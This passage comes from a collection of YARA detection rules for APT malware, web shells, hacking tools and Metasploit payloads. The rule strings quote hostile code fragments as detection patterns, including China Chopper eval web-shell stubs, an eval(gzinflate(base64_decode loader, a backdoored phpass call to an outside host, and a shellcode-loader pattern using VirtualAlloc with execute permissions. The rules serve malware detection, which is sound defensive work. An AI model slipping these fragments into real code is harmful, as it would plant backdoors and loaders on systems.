		$z3 = "User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC" ascii /* PEStudio Blacklist: agent */ /* score: '32.03' */
		
		$s1 = "http://%s/device_command.asp?device_id=%s&cv=%s&command=%s" fullword ascii /* PEStudio Blacklist: strings */ /* score: '36.02' */
		$s2 = "kill process error!" fullword ascii /* PEStudio Blacklist: strings */ /* score: '24.04' */
		$s3 = "kill process success!" fullword ascii /* PEStudio Blacklist: strings */ /* score: '21.04' */
		$s4 = "pickup command error!" fullword ascii /* PEStudio Blacklist: strings */ /* score: '21.04' */
		$s5 = "http://%s/record.asp?device_t=%s&key=%s&device_id=%s&cv=%s&result=%s" fullword ascii /* score: '20.01' */
		$s6 = "no command" fullword ascii /* PEStudio Blacklist: strings */ /* score: '19.05' */
		$s7 = "software\\microsoft\\windows\\currentversion\\run" fullword ascii /* score: '19.02' */
		$s8 = "command is null!" fullword ascii /* PEStudio Blacklist: strings */ /* score: '18.05' */
		$s9 = "pickup command Ok!" fullword ascii /* PEStudio Blacklist: strings */ /* score: '18.04' */
		$s10 = "http://%s/result_%s.htm" fullword ascii /* score: '18.01' */
	condition:
		uint16(0) == 0x5a4d and 
		( 1 of ($x*) ) or 
		( all of ($z*) ) or 
		( 8 of ($s*) )
}

rule APT_UNC5221_Ivanti_ForensicArtifacts_Jan24_1 {
   meta:
      description = "Detects forensic artifacts found in the Ivanti VPN exploitation campaign by APT UNC5221"
      author = "Florian Roth"
      reference = "https://www.mandiant.com/resources/blog/suspected-apt-targets-ivanti-zero-day"
      date = "2024-01-11"
      score = 75
      id = "49ba2a96-379d-5a58-979d-45e83fa546e7"
   strings:
      $x1 = "system(\"chmod a+x /home/etc/sql/dsserver/sessionserver.sh\");"
      $x2 = "SSH-2.0-OpenSSH_0.3xx."
      $x3 = "sed -i '/retval=$(exec $installer $@)/d' /pkg/do-install"
   condition:
      filesize < 5MB and 1 of them
}

rule Rombertik_CarbonGrabber_Panel_InstallScript {
	meta:
		description = "Detects CarbonGrabber alias Rombertik panel install script - file install.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		reference = "http://blogs.cisco.com/security/talos/rombertik"
		date = "2015-05-05"
		hash = "cd6c152dd1e0689e0bede30a8bd07fef465fbcfa"
		id = "f6c04e27-bbab-5012-a4f9-71d49d252b83"
	strings:
		$s0 = "$insert = \"INSERT INTO `logs` (`id`, `ip`, `name`, `host`, `post`, `time`, `bro" ascii
		$s3 = "`post` text NOT NULL," fullword ascii
		$s4 = "`host` text NOT NULL," fullword ascii
		$s5 = ") ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=5 ;\" ;" fullword ascii
		$s6 = "$db->exec($columns); //or die(print_r($db->errorInfo(), true));;" fullword ascii
		$s9 = "$db->exec($insert);" fullword ascii
		$s10 = "`browser` text NOT NULL," fullword ascii
		$s13 = "`ip` text NOT NULL," fullword ascii
	condition:
		filesize < 3KB and all of them
}

rule Rombertik_CarbonGrabber_Builder {
	meta:
		description = "Detects CarbonGrabber alias Rombertik Builder - file Builder.exe"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		reference = "http://blogs.cisco.com/security/talos/rombertik"
		date = "2015-05-05"
		hash = "b50ecc0ba3d6ec19b53efe505d14276e9e71285f"
		id = "3233c139-ac06-576c-9870-51306d5aa385"
	strings:
		$s0 = "c:\\users\\iden\\documents\\visual studio 2010\\Projects\\FormGrabberBuilderC++" ascii
		$s1 = "Host(www.panel.com): " fullword ascii
		$s2 = "Path(/form/index.php?a=insert): " fullword ascii
		$s3 = "FileName: " fullword ascii
		$s4 = "~Rich8" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 35KB and all of them
}

rule HDRoot_Sample_Jul17_2 {
   meta:
      description = "Detects HDRoot samples"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "Winnti HDRoot VT"
      date = "2017-07-07"
      super_rule = 1
      hash1 = "1c302ed9786fc600073cc6f3ed2e50e7c23785c94a2908f74f92971d978b704b"
      hash2 = "3b7cfa40e26fb6b079b55ec030aba244a6429e263a3d9832e32ab09e7a3c4a9c"
      hash3 = "71eddf71a94c5fd04c9f3ff0ca1eb6b1770df1a3a8f29689fb8588427b5c9e8e"
      hash4 = "80e088f2fd2dbde0f9bc21e056b6521991929c4e0ecd3eb5833edff6362283f4"
      id = "9ce9c0f4-e6f9-5033-ba74-367e6d741650"
   strings:
      $x1 = "http://microsoftcompanywork.htm" fullword ascii
      $x2 = "compose.aspx?s=%4X%4X%4X%4X%4X%4X" fullword ascii

      $t1 = "http://babelfish.yahoo.com/translate_url?" fullword ascii
      $t2 = "http://translate.google.com/translate?prev=hp&hl=en&js=n&u=%s?%d&sl=es&tl=en" fullword ascii

      $u1 = "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; SLCC1; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 3.5." ascii
      $u2 = "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Maxthon)" fullword ascii
      $u3 = "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Maxthon; TERA:" fullword ascii

      $s1 = "\\system32\\ntoskrnl.exe" ascii
      $s2 = "Schedsvc.dll" fullword wide
      $s3 = "dllserver64.dll" fullword ascii
      $s4 = "C:\\TERA_SR.txt" fullword ascii
      $s5 = "updatevnsc.dat" fullword wide
      $s6 = "tera dll service global event" fullword ascii
      $s7 = "Referer: http://%s/%s" fullword ascii
      $s8 = "tera replace dll config" fullword ascii
      $s9 = "SetupDll64.dll" fullword ascii
      $s10 = "copy %%ComSpec%% \"%s\"" fullword ascii
   condition:
      uint16(0) == 0x5a4d and filesize < 300KB and ( 1 of ($x*) or all of ($u*) or 8 of them )
}

rule FourElementSword_ElevateDLL {
	meta:
		description = "Detects FourElementSword Malware"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		reference = "https://www.arbornetworks.com/blog/asert/four-element-sword-engagement/"
		date = "2016-04-18"
		super_rule = 1
		hash1 = "3dfc94605daf51ebd7bbccbb3a9049999f8d555db0999a6a7e6265a7e458cab9"
		hash2 = "5f3d0a319ecc875cc64a40a34d2283cb329abcf79ad02f487fbfd6bef153943c"
		id = "06879d75-18a3-5d49-a963-fa4bee379387"
	strings:
		$x1 = "Elevate.dll" fullword wide
		$x2 = "ResN32.dll" fullword wide

		$s1 = "Kingsoft\\Antivirus" fullword wide
		$s2 = "KasperskyLab\\protected" fullword wide
		$s3 = "Sophos" fullword wide
	condition:
		( uint16(0) == 0x5a4d and filesize < 500KB and 1 of ($x*) and all of ($s*) )
		or ( all of them )
}

rule Slingshot_APT_Malware_2 {
   meta:
      description = "Detects malware from Slingshot APT"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://securelist.com/apt-slingshot/84312/"
      date = "2018-03-09"
      hash1 = "2a51ef6d115daa648ddd57d1e4480f5a18daf40986bfde32aab19349aa010e67"
      id = "b85d3d81-0148-5ea0-9eff-d9bb63e3e75b"
   strings:
      $x1 = "\\\\?\\c:\\RECYCLER\\S-1-5-21-2225084468-623340172-1005306204-500\\INFO5" fullword wide
      $x_slingshot = {09 46 BE 57 42 DD 70 35 5E }

      $s1 = "Opening service %s for stop access failed.#" fullword wide
      $s2 = "LanMan setting <%s> is ignored because system has a higher value already." fullword wide
      $s3 = "\\DosDevices\\amxpci" wide
      $s4 = "lNTLMqSpPD" fullword ascii
   condition:
      uint16(0) == 0x5a4d and filesize < 900KB and ( 1 of ($x*) or 4 of them )
}

rule apt_RU_MoonlightMaze_customlokitools {

meta:

	author = "Kaspersky Lab"
	date = "2017-03-15"
	version = "1.1"
	last_modified = "2017-03-22"
	reference = "https://en.wikipedia.org/wiki/Moonlight_Maze"
	description = "Rule to detect Moonlight Maze Loki samples by custom attacker-authored strings"
	hash = "14cce7e641d308c3a177a8abb5457019"
	hash = "a3164d2bbc45fb1eef5fde7eb8b245ea"
	hash = "dabee9a7ea0ddaf900ef1e3e166ffe8a"
	hash = "1980958afffb6a9d5a6c73fc1e2795c2"
	hash = "e59f92aadb6505f29a9f368ab803082e"

	id = "d5795d3b-bbb1-59e9-b86d-666b5c911f3b"
strings:

	$a1="Write file Ok..." ascii wide
	$a2="ERROR: Can not open socket...." ascii wide
	$a3="Error in parametrs:"  ascii wide
	$a4="Usage: @<get/put> <IP> <PORT> <file>"  ascii wide
	$a5="ERROR: Not connect..."  ascii wide
	$a6="Connect successful...."  ascii wide
	$a7="clnt <%d> rqstd n ll kll"  ascii wide
	$a8="clnt <%d> rqstd swap"  ascii wide
	$a9="cld nt sgnl prcs grp" ascii wide
	$a10="cld nt sgnl prnt" ascii wide

	//keeping only ascii version of string ->
	$a11="ork error" ascii fullword

condition:
	// Added filesize due to false positives with Nvidia drivers in process memory
	filesize < 5000KB and 3 of ($a*)
}

rule apt_RU_MoonlightMaze_customsniffer {

meta:

	author = "Kaspersky Lab"
	date = "2017-03-15"
	version = "1.1"
	reference = "https://en.wikipedia.org/wiki/Moonlight_Maze"
	description = "Rule to detect Moonlight Maze sniffer tools"
	hash = "7b86f40e861705d59f5206c482e1f2a5"
	hash = "927426b558888ad680829bd34b0ad0e7"
	original_filename = "ora;tdn"

	id = "8cc76e4d-a956-543c-81e0-827dfdb5da1c"
strings:


	//strings from ora ->
	$a1="/var/tmp/gogo" fullword
	$a2="myfilename= |%s|" fullword
	$a3="mypid,mygid=" fullword
	$a4="mypid=|%d| mygid=|%d|" fullword

	//strings from tdn ->
	$a5="/var/tmp/task" fullword
	$a6="mydevname= |%s|" fullword

condition:
	2 of ($a*)
}

rule apt_RU_MoonlightMaze_encrypted_keylog {

meta:

	author = "Kaspersky Lab"
	date = "2017-03-27"
	version = "1.0"
	last_modified = "2017-03-27"
	reference = "https://en.wikipedia.org/wiki/Moonlight_Maze"
	description = "Rule to detect Moonlight Maze encrypted keylogger logs"

	id = "f0d464f0-3955-5f41-a57f-8aa225e1171d"
strings:
	$a1={47 01 22 2A 6D 3E 39 2C}

condition:
	uint32(0) == 0x2a220147 and ($a1 at 0)

}

rule VULN_PHP_Hack_Backdoored_Phpass_May21 {
   meta:
      description = "Detects backdoored PHP phpass version"
      author = "Christian Burkard"
      reference = "https://twitter.com/s0md3v/status/1529005758540808192"
      date = "2022-05-24"
      score = 75
      id = "da13924c-0448-589c-bb2a-ee09736a5602"
   strings:
      $x1 = "file_get_contents(\"http://anti-theft-web.herokuapp.com/hacked/$access/$secret\")" ascii
   condition:
      filesize < 30KB and $x1
}

rule HKTL_NET_GUID_CasperStager {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/ustayready/CasperStager"
        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
        author = "Arnim Rupp (https://github.com/ruppde)"
        date = "2020-12-28"
        modified = "2023-04-06"
        id = "0ad18d2b-b7cc-5316-a8e8-b05d4439b8e1"
    strings:
        $typelibguid0lo = "c653a9f2-0939-43c8-9b93-fed5e2e4c7e6" ascii wide
        $typelibguid0up = "C653A9F2-0939-43C8-9B93-FED5E2E4C7E6" ascii wide
        $typelibguid1lo = "48dfc55e-6ae5-4a36-abef-14bc09d7510b" ascii wide
        $typelibguid1up = "48DFC55E-6AE5-4A36-ABEF-14BC09D7510B" ascii wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule xDedic_SysScan_unpacked {
   meta:
      author = " Kaspersky Lab"
      maltype = "crimeware"
      type ="crimeware"
      description = "Detects SysScan APT tool"
      reference = "https://securelist.com/blog/research/75027/xdedic-the-shady-world-of-hacked-servers-for-sale/"
      filetype = "Win32 EXE"
      date = "2016-03-14"
      version = "1.0"
      hash1 = "fac495be1c71012682ebb27092060b43"
      hash2 = "e8cc69231e209db7968397e8a244d104"
      hash3 = "a53847a51561a7e76fd034043b9aa36d"
      hash4 = "e8691fa5872c528cd8e72b82e7880e98"
      hash5 = "F661b50d45400e7052a2427919e2f777"
      id = "4f5d37b3-e3aa-51ec-b36e-b494c8abe227"
   strings:
      $a1 = "/c ping -n 2 127.0.0.1 & del \"SysScan.exe\"" ascii wide
      $a2 = "SysScan DEBUG Mode!!!" ascii wide
      $a3 = "This rechecking? (set 0/1 or press enter key)" ascii wide
      $a4 = "http://37.49.224.144:8189/manual_result" ascii wide

      $b1 = "Checker end work!" ascii wide
      $b2 = "Trying send result..." ascii wide
   condition:
      uint16(0) == 0x5A4D and filesize < 5000000 and ( any of ($a*) or all of ($b*) )
}

rule xdedic_packed_syscan {
   meta:
      author = "Kaspersky Lab - modified by Florian Roth"
      company = "Kaspersky Lab"
      id = "da8e59f3-53f9-504b-afff-9caab798db6c"
   strings:
      $a1 = "SysScan.exe" nocase ascii wide
      $a2 = "1.3.4." wide
   condition:
      uint16(0) == 0x5A4D and filesize > 500KB and filesize < 1500KB and all of them
}

rule CVE_2015_1674_CNGSYS {
	meta:
		description = "Detects exploits for CVE-2015-1674"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		reference = "http://www.binvul.com/viewthread.php?tid=508"
		date = "2015-05-14"
		hash = "af4eb2a275f6bbc2bfeef656642ede9ce04fad36"
		id = "1161b395-a19e-5aac-8416-8a4e60aeca37"
	strings:
		$s1 = "\\Device\\CNG" wide
		
		$s2 = "GetProcAddress" fullword ascii
		$s3 = "LoadLibrary" ascii
		$s4 = "KERNEL32.dll" fullword ascii
		$s5 = "ntdll.dll" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 60KB and all of them
}

rule Lazarus_Dec_17_1 {
   meta:
      description = "Detects Lazarus malware from incident in Dec 2017"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://goo.gl/8U6fY2"
      date = "2017-12-20"
      hash1 = "d5f9a81df5061c69be9c0ed55fba7d796e1a8ebab7c609ae437c574bd7b30b48"
      id = "f195ebf0-d7af-58e8-a544-769a0c8b628b"
   strings:
      $s1 = "::DataSpace/Storage/MSCompressed/Transform/" ascii
      $s2 = "HHA Version 4." ascii
      $s3 = { 74 45 58 74 53 6F 66 74 77 61 72 65 00 41 64 6F
              62 65 20 49 6D 61 67 65 52 65 61 64 79 71 }
      $s4 = "bUEeYE" fullword ascii
   condition:
      uint16(0) == 0x5449 and filesize < 4000KB and all of them
}

rule trigger_drop {
    meta:
        description = "Chinese Hacktool Set - file trigger_drop.php"
        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
        reference = "http://tools.zjqhr.com/"
        date = "2015-06-13"
        hash = "165dd2d82bf87285c8a53ad1ede6d61a90837ba4"
        id = "3b4f32ff-2de2-5689-869a-8a8f55e7fa0c"
    strings:
        $s0 = "$_GET['returnto'] = 'database_properties.php';" fullword ascii
        $s1 = "echo('<meta http-equiv=\"refresh\" content=\"0;url=' . $_GET['returnto'] . '\">'" ascii
        $s2 = "@mssql_query('DROP TRIGGER" ascii
        $s3 = "if(empty($_GET['returnto']))" fullword ascii
    condition:
        filesize < 5KB and all of them
}

rule InjectionParameters {
    meta:
        description = "Chinese Hacktool Set - file InjectionParameters.vb"
        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
        reference = "http://tools.zjqhr.com/"
        date = "2015-06-13"
        hash = "4f11aa5b3660c45e527606ee33de001f4994e1ea"
        id = "a77bd0c6-8857-577f-831a-0fcf2537667e"
    strings:
        $s0 = "Public Shared ReadOnly Empty As New InjectionParameters(-1, \"\")" fullword ascii
        $s1 = "Public Class InjectionParameters" fullword ascii
    condition:
        filesize < 13KB and all of them
}

rule users_list {
    meta:
        description = "Chinese Hacktool Set - file users_list.php"
        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
        reference = "http://tools.zjqhr.com/"
        date = "2015-06-13"
        hash = "6fba1a1a607198ed232405ccbebf9543037a63ef"
        id = "2d90b593-6b65-502c-aeb0-8f2a3d65afd3"
    strings:
        $s0 = "<a href=\"users_create.php\">Create User</a>" fullword ascii
        $s7 = "$skiplist = array('##MS_AgentSigningCertificate##','NT AUTHORITY\\NETWORK SERVIC" ascii
        $s11 = "&nbsp;<b>Default DB</b>&nbsp;" fullword ascii
    condition:
        filesize < 12KB and all of them
}

rule trigger_modify {
    meta:
        description = "Chinese Hacktool Set - file trigger_modify.php"
        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
        reference = "http://tools.zjqhr.com/"
        date = "2015-06-13"
        hash = "c93cd7a6c3f962381e9bf2b511db9b1639a22de0"
        id = "a7d65a9f-82de-554c-8f20-7560d2160041"
    strings:
        $s1 = "<form name=\"form1\" method=\"post\" action=\"trigger_modify.php?trigger=<?php e" ascii
        $s2 = "$data_query = @mssql_query('sp_helptext \\'' . urldecode($_GET['trigger']) . '" ascii
        $s3 = "if($_POST['query'] != '')" fullword ascii
        $s4 = "$lines[] = 'I am unable to read this trigger.';" fullword ascii
        $s5 = "<b>Modify Trigger</b>" fullword ascii
    condition:
        filesize < 15KB and all of them
}

rule oracle_data {
    meta:
        description = "Chinese Hacktool Set - file oracle_data.php"
        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
        reference = "http://tools.zjqhr.com/"
        date = "2015-06-13"
        hash = "6cf070017be117eace4752650ba6cf96d67d2106"
        id = "faa62dcc-0f59-573c-8722-d07216de151f"
    strings:
        $s0 = "$txt=fopen(\"oracle_info.txt\",\"w\");" fullword ascii
        $s1 = "if(isset($_REQUEST['id']))" fullword ascii
        $s2 = "$id=$_REQUEST['id'];" fullword ascii
    condition:
        all of them
}

rule reDuhServers_reDuh {
    meta:
        description = "Chinese Hacktool Set - file reDuh.jsp"
        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
        reference = "http://tools.zjqhr.com/"
        date = "2015-06-13"
        hash = "377886490a86290de53d696864e41d6a547223b0"
        id = "c87d971a-a16f-5593-88fb-6bcd207e0841"
    strings:
        $s1 = "out.println(\"[Error]Unable to connect to reDuh.jsp main process on port \" +ser" ascii
        $s4 = "System.out.println(\"IPC service failed to bind to \" + servicePort);" fullword ascii $s17 = "System.out.println(\"Bound on \" + servicePort);" fullword ascii
        $s5 = "outputFromSockets.add(\"[data]\"+target+\":\"+port+\":\"+sockNum+\":\"+new Strin" ascii
    condition:
        filesize < 116KB and all of them
}

rule reDuhServers_reDuh_2 {
    meta:
        description = "Chinese Hacktool Set - file reDuh.php"
        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
        reference = "http://tools.zjqhr.com/"
        date = "2015-06-13"
        hash = "512d0a3e7bb7056338ad0167f485a8a6fa1532a3"
        id = "6050dfde-6c79-5dd8-a772-508668177aa5"
    strings:
        $s1 = "errorlog(\"FRONTEND: send_command '\".$data.\"' on port \".$port.\" returned \"." ascii
        $s2 = "$msg = \"newData:\".$socketNumber.\":\".$targetHost.\":\".$targetPort.\":\".$seq" ascii
        $s3 = "errorlog(\"BACKEND: *** Socket key is \".$sockkey);" fullword ascii
    condition:
        filesize < 57KB and all of them
}

rule ChinaChopper_one {
    meta:
        description = "Chinese Hacktool Set - file one.asp"
        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
        reference = "http://tools.zjqhr.com/"
        date = "2015-06-13"
        hash = "6cd28163be831a58223820e7abe43d5eacb14109"
        id = "854fb5c9-38c7-5fd2-a473-66ae297070f5"
    strings:
        $s0 = "<%eval request(" ascii
    condition:
        filesize < 50 and all of them
}

rule item_301 {
    meta:
        description = "Chinese Hacktool Set - file item-301.php"
        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
        reference = "http://tools.zjqhr.com/"
        date = "2015-06-13"
        hash = "15636f0e7dc062437608c1f22b1d39fa15ab2136"
        id = "4ee9a089-313f-53c1-8196-1348d721dbf4"
    strings:
        $s1 = "$sURL = \"301:http://\".$sServer.\"/index.asp\";" fullword ascii
        $s2 = "(gov)\\\\.(cn)$/i\", $aURL[\"host\"])" ascii
        $s3 = "$aArg = explode(\" \", $sContent, 5);" fullword ascii
        $s4 = "$sURL = $aArg[0];" fullword ascii
    condition:
        filesize < 3KB and 3 of them
}

rule CN_Tools_item {
    meta:
        description = "Chinese Hacktool Set - file item.php"
        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
        reference = "http://tools.zjqhr.com/"
        date = "2015-06-13"
        hash = "a584db17ad93f88e56fd14090fae388558be08e4"
        id = "954f24c9-d7d5-56d3-86f0-0cf8832640dd"
    strings:
        $s1 = "$sURL = \"http://\".$sServer.\"/\".$sWget;" fullword ascii
        $s2 = "$sURL = \"301:http://\".$sServer.\"/\".$sWget;" fullword ascii
        $s3 = "$sWget=\"index.asp\";" fullword ascii
        $s4 = "$aURL += array(\"scheme\" => \"\", \"host\" => \"\", \"path\" => \"\");" fullword ascii
    condition:
        filesize < 4KB and all of them
}

rule Tools_2015 {
    meta:
        description = "Chinese Hacktool Set - file 2015.jsp"
        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
        reference = "http://tools.zjqhr.com/"
        date = "2015-06-13"
        hash = "8fc67359567b78cadf5d5c91a623de1c1d2ab689"
        id = "eb2826ab-ef8d-5a93-9ede-f5bbd7ab4ff4"
    strings:
        $s0 = "Configbis = new BufferedInputStream(httpUrl.getInputStream());" fullword ascii
        $s4 = "System.out.println(Oute.toString());" fullword ascii
        $s5 = "String ConfigFile = Outpath + \"/\" + request.getParameter(\"ConFile\");" fullword ascii
        $s8 = "HttpURLConnection httpUrl = null;" fullword ascii
        $s19 = "Configbos = new BufferedOutputStream(new FileOutputStream(Outf));;" fullword ascii
    condition:
        filesize < 7KB and all of them
}

rule ChinaChopper_temp_2 {
    meta:
        description = "Chinese Hacktool Set - file temp.php"
        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
        reference = "http://tools.zjqhr.com/"
        date = "2015-06-13"
        hash = "604a4c07161ce1cd54aed5566e5720161b59deee"
        id = "3952ed2b-fb27-5c45-9cd7-b7a300b37c0e"
    strings:
        $s0 = "@eval($_POST[strtoupper(md5(gmdate(" ascii
    condition:
        filesize < 150 and all of them
}

rule templatr {
    meta:
        description = "Chinese Hacktool Set - file templatr.php"
        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
        reference = "http://tools.zjqhr.com/"
        date = "2015-06-13"
        hash = "759df470103d36a12c7d8cf4883b0c58fe98156b"
        id = "b361a49d-1e05-5597-bf8b-735e04397ffa"
    strings:
        $s0 = "eval(gzinflate(base64_decode('" ascii
    condition:
        filesize < 70KB and all of them
}

rule reDuhServers_reDuh_3 {
    meta:
        description = "Chinese Hacktool Set - file reDuh.aspx"
        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
        reference = "http://tools.zjqhr.com/"
        date = "2015-06-13"
        hash = "0744f64c24bf4c0bef54651f7c88a63e452b3b2d"
        id = "69f5fd6b-a9b3-500b-8723-d1c82494903d"
    strings:
        $s1 = "Response.Write(\"[Error]Unable to connect to reDuh.jsp main process on port \" +" ascii
        $s2 = "host = System.Net.Dns.Resolve(\"127.0.0.1\");" fullword ascii
        $s3 = "rw.WriteLine(\"[newData]\" + targetHost + \":\" + targetPort + \":\" + socketNum" ascii
        $s4 = "Response.Write(\"Error: Bad port or host or socketnumber for creating new socket" ascii
    condition:
        filesize < 40KB and all of them
}

rule Metasploit_Loader_RSMudge {
	meta:
		description = "Detects a Metasploit Loader by RSMudge - file loader.exe"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		reference = "https://github.com/rsmudge/metasploit-loader"
		date = "2016-04-20"
		hash1 = "afe34bfe2215b048915b1d55324f1679d598a0741123bc24274d4edc6e395a8d"
		id = "4d8a215e-a942-5df9-bdad-0c4158992429"
	strings:
		$s1 = "Could not resolve target" fullword ascii
		$s2 = "Could not connect to target" fullword ascii
		$s3 = "%s [host] [port]" fullword ascii
		$s4 = "ws2_32.dll is out of date." fullword ascii
		$s5 = "read a strange or incomplete length value" fullword ascii
	condition:
		( uint16(0) == 0x5a4d and filesize < 200KB and ( 3 of ($s*) ) ) or ( all of them )
}

rule EXPL_LOG_CVE_2021_27055_Exchange_Forensic_Artefacts : LOG {
   meta:
      description = "Detects suspicious log entries that indicate requests as described in reports on HAFNIUM activity"
      author = "Zach Stanford - @svch0st, Florian Roth"
      reference = "https://www.microsoft.com/security/blog/2021/03/02/hafnium-targeting-exchange-servers/#scan-log"
      reference_2 = "https://www.praetorian.com/blog/reproducing-proxylogon-exploit/"
      date = "2021-03-10"
      modified = "2021-03-15"
      score = 65
      id = "8b0110a9-fd03-5f7d-bdd8-03ff48bcac68"
   strings:
      $x1 = "ServerInfo~" ascii wide

      $sr1 = /\/ecp\/[0-9a-zA-Z]{1,3}\.js/ ascii wide  /* Adjusted to cover MSF exploit https://github.com/rapid7/metasploit-framework/blob/e5c76bfe13acddc4220d7735fdc3434d9c64736e/modules/exploits/windows/http/exchange_proxylogon_rce.rb */

      $s1 = "/ecp/auth/w.js" ascii wide 
      $s2 = "/owa/auth/w.js" ascii wide
      $s3 = "/owa/auth/x.js" ascii wide
      $s4 = "/ecp/main.css" ascii wide
      $s5 = "/ecp/default.flt" ascii wide
      $s6 = "/owa/auth/Current/themes/resources/logon.css" ascii wide
   condition:
      $x1 and 1 of ($s*)
}

rule Msfpayloads_msf {
   meta:
      description = "Metasploit Payloads - file msf.sh"
      author = "Florian Roth (Nextron Systems)"
      reference = "Internal Research"
      date = "2017-02-09"
      modified = "2022-08-18"
      hash1 = "320a01ec4e023fb5fbbaef963a2b57229e4f918847e5a49c7a3f631cb556e96c"
      id = "c56dbb8e-1e03-5112-b2ef-a0adfd14dffa"
   strings:
      $s1 = "export buf=\\" ascii
   condition:
      filesize < 5MB and $s1
}

rule Msfpayloads_msf_3 {
   meta:
      description = "Metasploit Payloads - file msf.psh"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "Internal Research"
      date = "2017-02-09"
      hash1 = "335cfb85e11e7fb20cddc87e743b9e777dc4ab4e18a39c2a2da1aa61efdbd054"
      id = "ad09167f-a12a-5f07-940b-df679fa8e6c0"
   strings:
      $s1 = "[DllImport(\"kernel32.dll\")] public static extern int WaitForSingleObject(" ascii
      $s2 = "public enum MemoryProtection { ExecuteReadWrite = 0x40 }" fullword ascii
      $s3 = ".func]::VirtualAlloc(0,"
      $s4 = ".func+AllocationType]::Reserve -bOr [" ascii
      $s5 = "New-Object System.CodeDom.Compiler.CompilerParameters" fullword ascii
      $s6 = "ReferencedAssemblies.AddRange(@(\"System.dll\", [PsObject].Assembly.Location))" fullword ascii
      $s7 = "public enum AllocationType { Commit = 0x1000, Reserve = 0x2000 }" fullword ascii
      $s8 = ".func]::CreateThread(0,0,$" fullword ascii
      $s9 = "public enum Time : uint { Infinite = 0xFFFFFFFF }" fullword ascii
      $s10 = "= [System.Convert]::FromBase64String(\"/" ascii
      $s11 = "{ $global:result = 3; return }" fullword ascii
   condition:
      4 of them
}

rule Msfpayloads_msf_4 {
   meta:
      description = "Metasploit Payloads - file msf.aspx"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "Internal Research"
      date = "2017-02-09"
      hash1 = "26b3e572ba1574164b76c6d5213ab02e4170168ae2bcd2f477f246d37dbe84ef"
      id = "00d7681b-6041-5fe1-adbb-8b7c40df0193"
   strings:
      $s1 = "= VirtualAlloc(IntPtr.Zero,(UIntPtr)" ascii
      $s2 = ".Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);" ascii
      $s3 = "[System.Runtime.InteropServices.DllImport(\"kernel32\")]" fullword ascii
      $s4 = "private static IntPtr PAGE_EXECUTE_READWRITE=(IntPtr)0x40;" fullword ascii
      $s5 = "private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr,UIntPtr size,Int32 flAllocationType,IntPtr flProtect);" fullword ascii
   condition:
      4 of them
}

rule Msfpayloads_msf_5 {
   meta:
      description = "Metasploit Payloads - file msf.msi"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
